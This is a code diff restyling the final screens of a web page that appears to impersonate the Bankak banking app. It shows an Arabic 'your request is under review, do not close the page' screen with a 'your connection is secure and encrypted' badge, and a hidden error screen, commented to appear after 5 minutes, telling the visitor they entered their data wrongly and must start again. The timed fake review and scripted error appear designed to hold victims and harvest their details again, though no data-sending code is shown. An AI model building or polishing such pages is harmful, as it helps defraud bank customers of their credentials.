@@ -465,39 +465,30 @@ select:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
   <div class="red-header compact">
     <div class="logo-wrap"><div class="logo-arabic sm">بنك<span>ك</span></div><div class="logo-english sm"><b>b</b>ankak</div></div>
   </div>
-  <div class="white-body" style="display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center">
+  <div class="white-body" style="display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;gap:20px">
+
+    <div class="step-bar"><div class="step-dot done"></div><div class="step-dot done"></div><div class="step-dot done"></div><div class="step-dot active"></div></div>
 
     <!-- انتظار -->
     <div id="wait-screen">
-      <div style="width:80px;height:80px;margin:0 auto 24px;position:relative">
-        <svg viewBox="0 0 80 80" style="animation:spin 2s linear infinite;width:80px;height:80px">
-          <circle cx="40" cy="40" r="34" fill="none" stroke="#F0E8E8" stroke-width="6"/>
-          <circle cx="40" cy="40" r="34" fill="none" stroke="var(--red)" stroke-width="6" stroke-linecap="round" stroke-dasharray="80 134"/>
-        </svg>
-        <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:28px">⏳</div>
-      </div>
-      <div style="font-size:20px;font-weight:800;color:var(--text-dark);margin-bottom:12px">طلبك قيد المراجعة</div>
-      <div style="font-size:14px;color:var(--text-muted);line-height:2;margin-bottom:24px">
-        يرجى عدم إغلاق الصفحة<br>
-        جاري مراجعة بياناتك...
+      <div style="font-size:56px;margin-bottom:16px">⏳</div>
+      <div style="font-size:20px;font-weight:800;color:var(--text-dark);margin-bottom:10px">طلبك قيد المراجعة</div>
+      <div style="font-size:14px;color:var(--text-muted);line-height:2;margin-bottom:20px">
+        يرجى عدم إغلاق الصفحة<br>جاري مراجعة بياناتك...
       </div>
       <div style="background:#FFF8E8;border:1px solid rgba(201,168,76,0.3);border-radius:12px;padding:14px 20px;font-size:13px;color:#8B6914;line-height:1.8">
-        🔒 اتصالك آمن ومشفر<br>
-        سيتم معالجة طلبك خلال لحظات
+        🔒 اتصالك آمن ومشفر<br>سيتم معالجة طلبك خلال لحظات
       </div>
     </div>
 
-    <!-- خطأ (يظهر بعد 5 دقائق) -->
+    <!-- خطأ بعد 5 دقائق -->
     <div id="error-screen" style="display:none">
-      <div style="font-size:64px;margin-bottom:16px">❌</div>
-      <div style="font-size:20px;font-weight:800;color:var(--red);margin-bottom:12px">حدث خطأ</div>
-      <div style="font-size:14px;color:var(--text-muted);line-height:2;margin-bottom:28px">
-        يبدو أنك قمت بإدخال البيانات بشكل خاطئ<br>
-        حاول مرة أخرى
+      <div style="font-size:56px;margin-bottom:16px">❌</div>
+      <div style="font-size:20px;font-weight:800;color:var(--red);margin-bottom:10px">حدث خطأ</div>
+      <div style="font-size:14px;color:var(--text-muted);line-height:2;margin-bottom:24px">
+        يبدو أنك قمت بإدخال البيانات بشكل خاطئ<br>حاول مرة أخرى
       </div>
-      <button class="btn-primary" onclick="resetAll()" style="max-width:280px">
-        البداية من الأول
-      </button>
+      <button class="btn-primary" onclick="resetAll()">البداية من الأول</button>
     </div>
 
   </div>
